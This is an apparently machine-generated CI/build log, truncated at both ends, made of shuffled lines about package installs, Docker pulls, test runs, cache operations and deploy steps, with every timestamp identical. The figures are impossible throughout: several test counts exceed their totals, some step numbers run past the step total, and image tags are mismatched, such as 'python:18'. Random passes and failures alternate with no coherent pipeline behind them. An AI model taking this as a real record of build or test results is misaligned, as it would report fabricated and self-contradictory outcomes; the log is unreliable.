active\nInstalling eslint@1.2.6\nCompiling utils/handler.rs...\nImage pulled successfully\nCoverage: 85% statements, 62% branches\nTest Suites: 19 passed, 11 total\nSnapshots: 6 passed, 29 total\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\n[12:46:59] DEBUG: Connection pool: 11 active\nBuilding Docker image...\nAlready up to date.\nStep 14/16: Deploying\n\u2717 build failed with exit code 107\nnpm install: added 216 packages\nArtifact uploaded: dist.zip (91MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/handler.rs...\nnpm install: resolved 445 packages\nCache restored successfully (306MB)\n[12:46:59] DEBUG: Memory usage: 1054MB\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nFetching from https://docker.io/package.json\n[12:46:59] INFO: Starting build process\nVerifying...\nArtifact downloaded: 22MB\nGenerating source maps...\n[12:46:59] INFO: Connecting to database\npip: Downloading axios-1.7.tar.gz\nStep 10/24: Building\nWARNING: jest has known vulnerabilities\nTest Suites: 50 passed, 43 total\nHEAD is now at 277daaa\nFetching from https://github.com/package.json\n[12:46:59] DEBUG: Connection pool: 18 active\nSwitched to branch 'bugfix/task-657'\nStep 12/19: Deploying\nStep 12/16: Testing\n[12:46:59] DEBUG: Loading configuration\nStep 4/21: Running migrations\nPushing to registry...\nConnection established\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling styles.css\n\u2713 All checks passed\n[12:46:59] WARN: Deprecated API usage\nInstalling webpack@4.13.5\n  PASS: integration/test_user_create.spec.js\nCache restored successfully (16MB)\nNODE_ENV=test\n[12:46:59] ERROR: Connection failed\nGenerating source maps...\nPulling image: python:3.11\nWaiting...\nRan 131 tests in 33s\n[12:46:59] DEBUG: Loading configuration\nReady.\n\u2713 Step 'install' succeeded\nSnapshots: 39 passed, 6 total\nRan 158 tests in 50s\nFetching from https://googleapis.com/package.json\nWARNING: lodash has known vulnerabilities\nStep 8/16: Building\nReady.\n\u2713 All checks passed\nCache restored successfully (479MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=production\nPOST /api - 200 (20ms)\n[12:46:59] DEBUG: Initializing service\n[12:46:59] DEBUG: Initializing service\nGenerating source maps...\nEnvironment: test\nCache restored successfully (199MB)\nConnection established\n\u2713 All checks passed\nCreating production build...\nPulling image: python:18\nPlatform: linux-x64\npip install: Successfully installed axios-5.3\nHEAD is now at 1b4bf1f\n[12:46:59] DEBUG: Loading configuration\nUsing Python 3.9\nUploading artifact 'build' (33 files)\nRan 171 tests in 20s\nMinifying vendor.js\nCreating production build...\nTLS handshake completed\n[12:46:59] DEBUG: Memory usage: 719MB\n[12:46:59] WARN: Deprecated API usage\nCompiling components/utils.go...\n[12:46:59] DEBUG: Connection pool: 6 active\n[12:46:59] WARN: Deprecated API usage\nLoading...\nStep 11/19: Deploying\nTests: 298 passed, 226 total\nRan 48 tests in 26s\nStep 11/20: Testing\nFetching submodules...\nStep 11/16: Linting\nMinifying main.js\nFetching from https://gcr.io/package.json\nStep 6/16: Testing\nTest Suites: 31 passed, 37 total\nCompiling lib/handler.rs...\nNODE_ENV=development\n  PASS: integration/test_cache_hit.spec.js\nStep 20/22: Running migrations\nTests: 497 passed, 280 total\nUsing Node.js 18.4.8\nFetching from https://googleapis.com/package.json\nStep 13/20: Testing\nTLS handshake completed\n[12:46:59] DEBUG: Query executed in 45ms\n[12:46:59] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:59] WARN: Deprecated API usage\nReady.\nBundling styles.js\nLoading...\nWARNING: lodash has known vulnerabilities\n\u2713 deploy completed\nWaiting...\nCache hit for key-8134\nCompiling utils/handler.rs...\nLayer 5/12: COPY command\n[12:46:59] DEBUG: Query executed in 100ms\npip install: Successfully installed jest-1.13\n=== Step e2e_tests completed ===\n=== Step: lint ===\nAlready up to date.\npip install: Successfully installed jest-1.18\nnpm install: resolved 1891 packages\nGenerating source maps...\nChecking out main branch\nFetching submodules...\nCache saved successfully\nSuccess!\nHEAD is now at 4d2e497\nTime: 69.794s\nTime: 42.909s\nArtifact uploaded: build.tar.gz (1MB)\n[12:46:59] DEBUG: Connection pool: 15 active\nUploading artifact 'build' (19 files)\nStep 17/20: Installing dependencies\nNODE_ENV=production\n[12:46:59] WARN: Deprecated API usage\nRan 43 tests in 42s\n\u2713 Step 'test' succeeded\n[12:46:59] DEBUG: Connection pool: 19 active\nHEAD is now at 03bd0b2\nFetching submodules...\n[12:46:59] INFO: Request completed\nStep 3/18: Building\nDone.\nUsing Python 3.9\nCompiling src/index.js...\n[12:46:59] DEBUG: Initializing service\nGET /api - 200 (22ms)\n  PASS: test_api_health (488ms)\nTests: 423 passed, 263 total\nCompiling utils/app.ts...\nTests: 360 passed, 368 total\nGenerating source maps...\nCache invalidated: node_modules\nWARNING: eslint has known vulnerabilities\nCompiling utils/utils.go...\nCompiling lib/service.java...\n[12:46:59] DEBUG: Query executed in 70ms\n[12:46:59] DEBUG: Initializing service\n\u2717 build failed with exit code 7\n[12:46:59] DEBUG: Memory usage: 1864MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\n  PASS: integration/test_user_create.spec.js\nArtifact uploaded: dist.zip (37MB)\nPulling image: node:3.11\nGET /status - 200 (8ms)\nCache hit for key-8758\nStep 5/22: Deploying\nSnapshots: 38 passed, 24 total\nFAILED: test_db_connect\npip: Collecting prettier\nFetching submodules...\n\u2717 build failed with exit code 52\nRan 28 tests in 22s\nOK\nyarn add: Done in 10.48s\nnpm notice: created a lockfile\nUploading artifact 'dist' (22 files)\nLayer 3/12: COPY command\n  PASS: unit/test_cache_hit.spec.js\n\u2713 All checks passed\n[12:46:59] WARN: Deprecated API usage\nFinished.\nRan 37 tests in 13s\nCompiling components/index.js...\nTest Suites: 15 passed, 18 total\nCache restored successfully (492MB)\nStep 17/25: Testing\n[12:46:59] WARN: Deprecated API usage\nCache saved successfully\n[12:46:59] INFO: Request completed\nImage pulled successfully\nSnapshots: 38 passed, 45 total\nRan 139 tests in 41s\nHEAD is now at c476bbb\nUploading artifact 'coverage' (19 files)\nHEAD is now at 7d9eb2e\nFAILED: test_user_create\nProcessing...\nWARNING: jest has known vulnerabilities\nTime: 19.409s\nFAILED: test_db_connect\nGenerating source maps...\nChecking out main branch\nChecking out master branch\nCache saved successfully\nBundling runtime.js\nOptimizing 33 modules...\nCache invalidated: node_modules\n[12:46:59] WARN: Deprecated API usage\nTest Suites: 48 passed, 11 total\n[12:46:59] DEBUG: Connection pool: 2 active\n[12:46:59] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 100% statements, 92% branches\nGET /api - 201 (85ms)\nConnection established\nTransforming 731 files...\nTransforming 312 files...\n[12:46:59] WARN: Deprecated API usage\nyarn add: Done in 17.2s\n[12:46:59] INFO: Cache refreshed\nWARNING: prettier has known vulnerabilities\nTime: 105.759s\nHEAD is now at ba5f3d5\nWARNING: react has known vulnerabilities\n[12:46:59] INFO: Connecting to database\nImage pulled successfully\nCache invalidated: dependencies\nyarn add: Done in 17.22s\npip: Downloading axios-3.7.tar.gz\nFinished.\nTest Suites: 28 passed, 20 total\nBundling main.css\nFAILED: test_user_create\n\u2713 Task completed in 3831ms\nArtifact downloaded: 44MB\nTests: 443 passed, 236 total\nEnvironment: development\nCompiling lib/handler.rs...\n[12:46:59] DEBUG: Query executed in 28ms\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nDone.\nMinifying main.js\nTransforming 442 files...\nArtifact uploaded: build.tar.gz (21MB)\npip: Downloading eslint-3.16.tar.gz\n[12:46:59] INFO: Connecting to database\nCompiling src/utils.go...\nnpm install: added 209 packages\nFetching submodules...\n[12:46:59] DEBUG: Loading configuration\nLoading...\n  PASS: integration/test_api_health.spec.js\nCompiling lib/app.ts...\nFetching submodules...\nHEAD is now at 71e0a23\nWARNING: express has known vulnerabilities\nArtifact downloaded: 22MB\nFinished.\nFetching submodules...\nTransforming 446 files...\n[12:46:59] ERROR: Connection failed\nnpm notice: created a lockfile\nTime: 41.778s\n[12:46:59] DEBUG: Connection pool: 19 active\n[12:46:59] WARN: Deprecated API usage\nCache invalidated: node_modules\nLoading...\nAlready up to date.\nStep 7/17: Linting\nPushing to registry...\nSwitched to branch 'hotfix/task-134'\n[12:46:59] DEBUG: Connection pool: 18 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1531 packages\nStep 13/24: Deploying\nCompiling src/main.py...\nProcessing...\nnpm install: added 122 packages\n\u2717 build failed with exit code 92\nVerifying...\nOptimizing 70 modules...\nCoverage: 91% statements, 69% branches\nInstalling express@2.16.8\n[12:46:59] WARN: Deprecated API usage\nSnapshots: 9 passed, 27 total\nWARNING: lodash has known vulnerabilities\nPushing to registry...\nWARNING: react has known vulnerabilities\nPulling image: node:latest\nAlready up to date.\nPushing to registry...\nFetching submodules...\nCompleted.\nTime: 29.943s\npip install: Successfully installed jest-2.18\nStep 5/15: Building\nnpm install: added 91 packages\n[12:46:59] WARN: Deprecated API usage\nStep 19/22: Testing\nFAILED: test_db_connect\nFinished.\nStep 6/17: Running migrations\nnpm notice: created a lockfile\nPushing to registry...\nInstalling express@4.16.4\nNODE_ENV=test\nStep 11/21: Building\nStep 10/17: Linting\nCoverage: 83% statements, 70% branches\nMinifying vendor.js\nCache miss for key-8163\nTest Suites: 7 passed, 50 total\n[12:46:59] INFO: Connecting to database\nCompiling utils/app.ts...\nVerifying...\n\u2717 build failed with exit code 11\nStep 17/21: Running migrations\nSwitched to branch 'feature/task-962'\n[12:46:59] DEBUG: Initializing service\nCompiling src/service.java...\nOptimizing 79 modules...\nCompiling components/main.py...\nOK\npip install: Successfully installed express-5.17\n[12:46:59] INFO: Processing request\nTime: 47.502s\nWaiting...\nReady.\n\u2717 build failed with exit code 37\nWARNING: lodash has known vulnerabilities\nMinifying vendor.js\n[12:46:59] INFO: Connecting to database\n[12:46:59] DEBUG: Loading configuration\nRan 76 tests in 56s\nArtifact downloaded: 11MB\nyarn add: Done in 5.57s\nStep 14/25: Installing dependencies\nOK\nFetching submodules...\n[12:46:59] WARN: Deprecated API usage\npip: Installing build dependencies...\nInstalling react@3.7.4\nCompleted.\nArtifact uploaded: dist.zip (84MB)\nTime: 108.803s\npip: Installing build dependencies...\n=== Step lint completed ===\n=== Step: build ===\nWaiting...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 382 files...\nRan 60 tests in 7s\nTLS handshake completed\nNODE_ENV=production\nConnection established\nCompiling src/utils.go...\nReady.\nFetching from https://npmjs.org/package.json\nCreating production build...\nWaiting...\npip: Collecting react\nnpm install: resolved 407 packages\nnpm install: resolved 1623 packages\nSuccess!\nSwitched to branch 'hotfix/task-716'\nyarn add: Done in 26.50s\nProcessing...\nLayer 6/10: ENV command\nCache invalidated: build\nRan 142 tests in 59s\nLoading...\nNODE_ENV=test\nStep 6/19: Deploying\nStep 7/15: Running migrations\n[12:46:59] DEBUG: Initializing service\nTime: 10.982s\nTest Suites: 23 passed, 39 total\nCompiling lib/index.js...\nCache invalidated: node_modules\nMinifying app.js\nDone.\nTransforming 637 files...\nEnvironment: development\n[12:46:59] INFO: Starting build process\n[12:46:59] WARN: Deprecated API usage\nCompiling utils/utils.go...\nOptimizing 67 modules...\nException: ValueError\nMinifying app.js\nCache miss for key-2050\nArtifact uploaded: build.tar.gz (5MB)\nFAILED: test_user_create\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 28\n[12:46:59] INFO: Starting build process\nCoverage: 87% statements, 82% branches\nCache saved successfully\n[12:46:59] INFO: Cache refreshed\n\u2717 build failed with exit code 28\nCache saved successfully\nArtifact uploaded: build.tar.gz (45MB)\nRan 15 tests in 39s\n[12:46:59] INFO: Connecting to database\nChecking out main branch\n[12:46:59] WARN: Deprecated API usage\nLoading...\nStep 19/20: Running migrations\nWaiting...\nCompiling src/utils.go...\nChecking out master branch\nSwitched to branch 'hotfix/task-606'\nStep 3/15: Building\nnpm install: added 387 packages\nFetching from https://github.com/package.json\nTransforming 268 files...\nStep 4/15: Deploying\n\u2713 All checks passed\n\u2713 Task completed in 743ms\nCompleted.\n[12:46:59] INFO: Processing request\nDone.\nMinifying app.js\nHEAD is now at 854dc64\n\u2713 test completed\nFAILED: test_db_connect\nPOST /data - 202 (310ms)\nVerifying...\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\npip: Collecting jest\nGET /health - 204 (97ms)\nUsing Python 3.12\nCache saved successfully\npip install: Successfully installed lodash-4.0\nCoverage: 99% statements, 70% branches\nCompiling components/index.js...\nImage pulled successfully\nnpm install: resolved 1931 packages\nWaiting...\nnpm notice: created a lockfile\nOK\n\u2713 test completed\n[12:46:59] INFO: Processing request\n\u2713 validate completed\n  PASS: test_cache_hit (100ms)\nMinifying app.js\nReady.\n\u2717 build failed with exit code 43\nCache restored successfully (144MB)\n  PASS: e2e/test_cache_hit.spec.js\nArtifact downloaded: 20MB\nStep 1/24: Deploying\nWaiting...\nWARNING: lodash has known vulnerabilities\nnpm notice: created a lockfile\n[12:46:59] WARN: Deprecated API usage\nProcessing...\nWaiting...\nPlatform: win32-x64\nWARNING: lodash has known vulnerabilities\nUploading artifact 'dist' (11 files)\nCache hit for key-5981\nRan 18 tests in 33s\n\u2713 Step 'setup' succeeded\nUsing Node.js 15.3.10\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nUploading artifact 'dist' (4 files)\nStep 8/25: Building\nCompiling src/index.js...\nTransforming 183 files...\nWARNING: jest has known vulnerabilities\n\u2713 Task completed in 1218ms\nFinished.\n[12:46:59] DEBUG: Loading configuration\npip install: Successfully installed eslint-1.2\nChecking out develop branch\n\u2713 deploy completed\n[12:46:59] DEBUG: Loading configuration\nCache hit for key-3719\nVerifying...\n[12:46:59] DEBUG: Initializing service\nLoading...\nFAILED: test_user_create\nGET /api - 201 (28ms)\nWaiting...\nCompiling utils/service.java...\nCreating production build...\n\u2713 Task completed in 2566ms\nStep 3/19: Installing dependencies\n\u2713 Step 'install' succeeded\n[12:46:59] DEBUG: Initializing service\nImage pulled successfully\nBundling runtime.js\nGenerating source maps...\nWARNING: prettier has known vulnerabilities\n[12:46:59] INFO: Processing request\nVerifying...\nRan 48 tests in 24s\nCreating production build...\nnpm notice: created a lockfile\nLayer 10/14: RUN command\nNODE_ENV=test\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (87MB)\n[12:46:59] DEBUG: Loading configuration\n\u2713 Task completed in 627ms\nConnection established\nSnapshots: 42 passed, 36 total\nPlatform: linux-x64\nSnapshots: 32 passed, 1 total\n[12:46:59] DEBUG: Initializing service\nyarn add: Done in 10.10s\n\u2713 Task completed in 3747ms\n[12:46:59] INFO: Cache refreshed\npip install: Successfully installed jest-2.19\nnpm install: added 366 packages\nConnection established\n[12:46:59] DEBUG: Connection pool: 12 active\nArtifact uploaded: build.tar.gz (3MB)\nCache invalidated: node_modules\nStep 4/24: Installing dependencies\nStep 2/16: Running migrations\nCompiling src/main.py...\nnpm install: resolved 111 packages\nnpm install: added 282 packages\nStep 14/24: Linting\n\u2713 Step 'setup' succeeded\n[12:46:59] INFO: Starting build process\nWARNING: prettier has known vulnerabilities\n[12:46:59] DEBUG: Query executed in 73ms\nStep 6/15: Deploying\nWaiting...\nImage pulled successfully\nProcessing...\nStep 15/22: Running migrations\nStep 10/19: Installing dependencies\n\u2713 Step 'install' succeeded\nUsing Python 3.9\n[12:46:59] DEBUG: Connection pool: 12 active\nnpm notice: created a lockfile\nLoading...\nPulling image: alpine:18\nPlatform: win32-x64\nArtifact uploaded: dist.zip (13MB)\nCache hit for key-1060\n  PASS: unit/test_api_health.spec.js\nSuccess!\nPlatform: linux-x64\n[12:46:59] WARN: Deprecated API usage\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nTests: 242 passed, 150 total\nTime: 84.84s\nBundling main.css\nCache miss for key-6845\n[12:46:59] INFO: Request completed\n[12:46:59] ERROR: Connection failed\nGET /api - 200 (35ms)\n  PASS: test_api_health (266ms)\nArtifact uploaded: dist.zip (34MB)\nCache saved successfully\n\u2713 Task completed in 4955ms\nTime: 7.936s\nChecking out master branch\nImage pulled successfully\npip install: Successfully installed webpack-5.20\nPOST /api - 202 (383ms)\n  PASS: test_cache_hit (143ms)\nUsing Python 3.9\n\u2713 Step 'install' succeeded\nWARNING: jest has known vulnerabilities\nProcessing...\nMinifying app.js\nUploading artifact 'dist' (26 files)\n\u2717 build failed with exit code 115\nLoading...\n[12:46:59] WARN: Deprecated API usage\n=== Step build completed ===\n=== Step: deploy_production ===\nCompiling src/utils.go...\nWARNING: prettier has known vulnerabilities\n[12:46:59] DEBUG: Loading configuration\nStep 7/24: Linting\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] DEBUG: Initializing service\nCompiling src/handler.rs...\nSuccess!\nCompiling utils/index.js...\nStep 7/23: Deploying\nVerifying...\nFetching from https://pypi.org/package.json\n[12:46:59] INFO: Cache refreshed\nTransforming 509 files...\npip install: Successfully installed webpack-5.20\nStep 1/25: Running migrations\nUsing Node.js 15.11.3\n[12:46:59] WARN: Deprecated API usage\n  PASS: unit/test_db_connect.spec.js\nCache hit for key-3159\nPlatform: darwin-arm64\npip: Downloading eslint-4.3.tar.gz\n[12:46:59] DEBUG: Connection pool: 6 active\n\u2713 Step 'build' succeeded\n\u2713 Task completed in 741ms\nSwitched to branch 'hotfix/task-445'\nStep 10/24: Deploying\nOptimizing 42 modules...\nBundling styles.css\nWARNING: eslint has known vulnerabilities\nUsing Node.js 20.6.7\nMinifying app.js\nyarn add: Done in 17.14s\n[12:46:59] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (23MB)\n[12:46:59] DEBUG: Loading configuration\n[12:46:59] WARN: Deprecated API usage\nBuilding Docker image...\nLoading...\n[12:46:59] INFO: Processing request\nnpm notice: package.json updated\nTests: 270 passed, 130 total\nnpm install: added 433 packages\nOptimizing 23 modules...\n\u2713 Step 'checkout' succeeded\nTime: 62.361s\nCompiling src/main.py...\nGenerating source maps...\n\u2713 All checks passed\n[12:46:59] INFO: Connecting to database\nOptimizing 19 modules...\n[12:46:59] INFO: Request completed\nPlatform: win32-x64\nMinifying main.js\nCoverage: 83% statements, 74% branches\nFetching from https://github.com/package.json\n[12:46:59] WARN: Deprecated API usage\n\u2713 lint completed\n\u2717 build failed with exit code 72\nCache restored successfully (115MB)\nFetching submodules...\nArtifact uploaded: dist.zip (63MB)\n\u2713 All checks passed\n[12:46:59] INFO: Cache refreshed\nGenerating source maps...\npip install: Successfully installed react-2.9\nnpm install: added 340 packages\n[12:46:59] ERROR: Connection failed\npip install: Successfully installed webpack-5.19\n[12:46:59] INFO: Connecting to database\nOptimizing 89 modules...\nnpm notice: created a lockfile\nException: TypeError\nCache restored successfully (120MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: alpine:18\nCoverage: 78% statements, 93% branches\nCache saved successfully\nyarn add: Done in 25.14s\nStep 5/24: Building\nStep 19/18: Testing\nProcessing...\nImage pulled successfully\nPlatform: darwin-arm64\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nDone.\nCompiling components/handler.rs...\n\u2713 build completed\n[12:46:59] DEBUG: Memory usage: 1721MB\nMinifying vendor.js\nCache restored successfully (339MB)\nArtifact uploaded: build.tar.gz (2MB)\nStep 20/20: Deploying\n[12:46:59] ERROR: Connection failed\nGET /health - 200 (30ms)\nStep 9/22: Installing dependencies\nWARNING: lodash has known vulnerabilities\npip: Downloading axios-2.20.tar.gz\n\u2713 Step 'test' succeeded\n[12:46:59] INFO: Starting build process\n[12:46:59] DEBUG: Query executed in 51ms\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/handler.rs...\nnpm install: resolved 1426 packages\n\u2713 validate completed\nCache saved successfully\nPulling image: alpine:latest\nStep 11/15: Installing dependencies\nFetching submodules...\nReady.\nnpm install: resolved 1577 packages\n[12:46:59] DEBUG: Connection pool: 5 active\n[12:46:59] WARN: Deprecated API usage\nNODE_ENV=development\nConnection established\nOK\nStep 4/22: Running migrations\nUsing Python 3.10\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:59] WARN: Deprecated API usage\nPulling image: alpine:latest\nStep 16/21: Building\nChecking out develop branch\nUploading artifact 'build' (1 files)\nWaiting...\npip: Installing build dependencies...\nInstalling axios@5.17.7\nSuccess!\n[12:46:59] DEBUG: Connection pool: 18 active\nVerifying...\nFetching submodules...\npip: Installing build dependencies...\nStep 6/17: Deploying\n[12:46:59] DEBUG: Connection pool: 16 active\nUploading artifact 'dist' (22 files)\nTransforming 695 files...\nRan 35 tests in 21s\n[12:46:59] DEBUG: Initializing service\nArtifact downloaded: 25MB\nFetching submodules...\nnpm notice: package.json updated\nCompiling utils/utils.go...\nBuilding Docker image...\nWaiting...\nCache restored successfully (70MB)\n\u2713 Step 'test' succeeded\nPushing to registry...\npip: Collecting express\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/18: Linting\nTest Suites: 21 passed, 12 total\n[12:46:59] DEBUG: Loading configuration\nCache invalidated: build\nnpm notice: package.json updated\nCache restored successfully (110MB)\nCache hit for key-3097\nWaiting...\nMinifying vendor.js\nRan 191 tests in 55s\nMinifying app.js\n[12:46:59] INFO: Request completed\npip: Collecting jest\nRan 130 tests in 1s\n[12:46:59] DEBUG: Initializing service\nEnvironment: test\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGenerating source maps...\nLoading...\n\u2713 Step 'build' succeeded\nFetching submodules...\nUsing Python 3.9\nnpm notice: package.json updated\nHEAD is now at 2b05f36\nConnection established\nImage pulled successfully\nProcessing...\nCoverage: 87% statements, 96% branches\n\u2713 Task completed in 4125ms\nUsing Python 3.12\nTransforming 137 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:59] INFO: Starting build process\nFetching submodules...\nNODE_ENV=development\n[12:46:59] DEBUG: Query executed in 85ms\nCreating production build...\nStep 3/24: Deploying\nPlatform: win32-x64\nPushing to registry...\nnpm notice: created a lockfile\npip: Downloading react-1.16.tar.gz\nFetching from https://googleapis.com/package.json\nBundling runtime.js\nStep 20/17: Building\nDone.\n\u2717 build failed with exit code 61\nTransforming 617 files...\nWARNING: prettier has known vulnerabilities\nBuilding Docker image...\nFinished.\n[12:46:59] DEBUG: Initializing service\nOptimizing 89 modules...\nCache restored successfully (404MB)\nyarn add: Done in 11.72s\n\u2713 Step 'setup' succeeded\nCompleted.\nCompiling lib/utils.go...\nLayer 10/11: ENV command\nRan 14 tests in 32s\nSnapshots: 11 passed, 12 total\nPlatform: darwin-arm64\n[12:46:59] INFO: Cache refreshed\n[12:46:59] WARN: Deprecated API usage\n[12:46:59] DEBUG: Initializing service\nStep 15/25: Testing\n\u2713 test completed\n[12:46:59] INFO: Starting build process\nTests: 465 passed, 87 total\nReady.\nCoverage: 92% statements, 65% branches\nCompiling src/service.java...\n\u2713 Task completed in 2154ms\nVerifying...\nnpm install: added 64 packages\nOptimizing 84 modules...\n  PASS: unit/test_api_health.spec.js\nSwitched to branch 'hotfix/task-876'\nEnvironment: development\nTransforming 541 files...\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nBundling styles.css\nUsing Python 3.11\nnpm notice: package.json updated\nStep 5/18: Running migrations\n\u2717 build failed with exit code 108\nFetching from https://amazonaws.com/package.json\nCompleted.\nLayer 6/13: RUN command\nUploading artifact 'build' (48 files)\nArtifact downloaded: 19MB\npip: Installing build dependencies...\nUploading artifact 'dist' (46 files)\nFinished.\nVerifying...\nSuccess!\n[12:46:59] DEBUG: Initializing service\n[12:46:59] INFO: Connecting to database\n[12:46:59] DEBUG: Connection pool: 19 active\nTransforming 288 files...\nStep 2/18: Running migrations\nBundling runtime.js\nUsing Python 3.10\nGenerating source maps...\n[12:46:59] DEBUG: Query executed in 31ms\nCompiling lib/app.ts...\nnpm install: resolved 324 packages\n\u2713 All checks passed\n\u2713 All checks passed\nnpm install: resolved 565 packages\n[12:46:59] DEBUG: Initializing service\nVerifying...\n\u2713 Task completed in 2484ms\nCache restored successfully (398MB)\npip: Collecting jest\nArtifact uploaded: dist.zip (4MB)\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n[12:46:59] DEBUG: Memory usage: 1516MB\nStep 14/23: Linting\n[12:46:59] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:59] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nTransforming 927 files...\nEnvironment: production\nDone.\npip: Downloading webpack-4.9.tar.gz\n[12:46:59] WARN: Deprecated API usage\nBundling main.js\n[12:46:59] DEBUG: Initializing service\nBundling main.css\nFinished.\nBundling vendor.css\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 18.5.4\n\u2713 Step 'build' succeeded\nEnvironment: staging\nProcessing...\nWARNING: react has known vulnerabilities\nVerifying...\nCompiling src/utils.go...\nTime: 66.990s\n[12:46:59] WARN: Deprecated API usage\nTLS handshake completed\nBundling runtime.css\n[12:46:59] ERROR: Connection failed\nStep 13/22: Testing\npip: Collecting lodash\nStep 11/24: Linting\nWARNING: axios has known vulnerabilities\nStep 18/16: Installing dependencies\npip: Installing build dependencies...\nCache saved successfully\nSuccess!\nSwitched to branch 'hotfix/task-953'\nArtifact downloaded: 24MB\nFinished.\nStep 3/24: Running migrations\nEnvironment: staging\nStep 12/15: Installing dependencies\nWARNING: react has known vulnerabilities\nAlready up to date.\n[12:46:59] DEBUG: Loading configuration\npip: Installing build dependencies...\nPlatform: darwin-arm64\n\u2713 lint completed\nChecking out main branch\nConnection established\nMinifying vendor.js\nBuilding Docker image...\nPulling image: python:3.11\nInstalling webpack@3.20.9\nCompleted.\nCompiling lib/handler.rs...\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling runtime.js\nArtifact downloaded: 28MB\nEnvironment: staging\nFinished.\n\u2713 validate completed\nArtifact uploaded: build.tar.gz (33MB)\nConnection established\nCache restored successfully (165MB)\npip install: Successfully installed eslint-2.11\nImage pulled successfully\nnpm install: resolved 1422 packages\nSwitched to branch 'bugfix/task-296'\n[12:46:59] WARN: Deprecated API usage\nStep 14/23: Linting\nTime: 45.897s\n  PASS: e2e/test_api_health.spec.js\nTests: 83 passed, 325 total\nUploading artifact 'build' (28 files)\nStep 11/15: Testing\nTime: 68.435s\nPulling image: python:3.11\nTransforming 701 files...\n[12:46:59] INFO: Cache refreshed\nCompiling lib/index.js...\nStep 7/22: Deploying\nCache restored successfully (496MB)\nStep 4/15: Building\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 test completed\nStep 6/20: Building\nCache invalidated: dependencies\n[12:46:59] ERROR: Connection failed\nTransforming 802 files...\nImage pulled successfully\nCache restored successfully (266MB)\nInstalling express@1.8.8\nAlready up to date.\nCreating production build...\nReady.\nTransforming 201 files...\nPushing to registry...\nSwitched to branch 'bugfix/task-887'\nProcessing...\nTransforming 461 files...\n\u2713 Step 'install' succeeded\nCache saved successfully\nTransforming 720 files...\nWaiting...\nEnvironment: staging\nCreating production build...\nCache restored successfully (439MB)\n[12:46:59] INFO: Processing request\n[12:46:59] INFO: Cache refreshed\nCache restored successfully (20MB)\nCompiling utils/app.ts...\nWaiting...\nStep 13/20: Building\nArtifact uploaded: build.tar.gz (30MB)\nCache restored successfully (257MB)\nFAILED: test_user_create\nCache saved successfully\nStep 1/20: Running migrations\nOptimizing 52 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /health - 204 (60ms)\nCreating production build...\nnpm install: resolved 1682 packages\nStep 7/15: Running migrations\n[12:46:59] DEBUG: Loading configuration\nOK\n[12:46:59] ERROR: Connection failed\npip install: Successfully installed prettier-5.11\n[12:46:59] INFO: Connecting to database\nBuilding Docker image...\n\u2713 Step 'install' succeeded\nFAILED: test_api_health\nUsing Node.js 19.11.5\nPushing to registry...\nLoading...\npip install: Successfully installed eslint-4.15\nBuilding Docker image...\nCreating production build...\nFAILED: test_user_create\nBuilding Docker image...\nUploading artifact 'coverage' (27 files)\nAlready up to date.\n[12:46:59] INFO: Connecting to database\nFetching from https://githubusercontent.com/package.json\nCache hit for key-9421\nCache miss for key-2544\nUsing Python 3.9\nPulling image: node:3.11\nMinifying vendor.js\nReady.\npip: Collecting eslint\nConnection established\nArtifact uploaded: dist.zip (93MB)\nStep 1/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBundling main.js\nCache hit for key-1771\nFetching from https://pypi.org/package.json\npip install: Successfully installed axios-5.18\nSuccess!\nBuilding Docker image...\nUsing Python 3.9\nUsing Node.js 18.19.4\nWARNING: axios has known vulnerabilities\nTransforming 289 files...\nTLS handshake completed\nnpm install: added 11 packages\nSwitched to branch 'bugfix/task-837'\nBuilding Docker image...\nChecking out main branch\nCompiling src/main.py...\nPlatform: darwin-arm64\n[12:46:59] INFO: Connecting to database\nFetching from https://googleapis.com/package.json\nCache hit for key-1282\nNODE_ENV=test\nnpm install: added 470 packages\nRan 121 tests in 14s\n  PASS: test_api_health (226ms)\nConnection established\n\u2713 Task completed in 3426ms\nMinifying main.js\nnpm notice: created a lockfile\nSwitched to branch 'bugfix/task-620'\nPushing to registry...\nWaiting...\nUploading artifact 'coverage' (48 files)\n  PASS: 